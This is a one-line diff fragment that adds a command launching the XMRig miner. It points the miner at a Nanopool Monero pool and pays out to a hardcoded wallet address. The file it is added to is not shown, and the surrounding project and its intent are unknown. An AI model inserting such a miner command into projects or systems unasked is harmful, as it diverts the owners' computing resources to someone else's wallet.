@@ -1,0 +1,1 @@
+./xmrig -o xmr-eu1.nanopool.org:14433 -u 46ZS3NQ4z3XFhmBdqW3gX1af7QdCkjxDTd5W3NpPDxgwMobUJt3C5akWjUdLvDV1MfUKbwqV8zSZC9N65exVWb2BDne7bPR --tls --coin monero
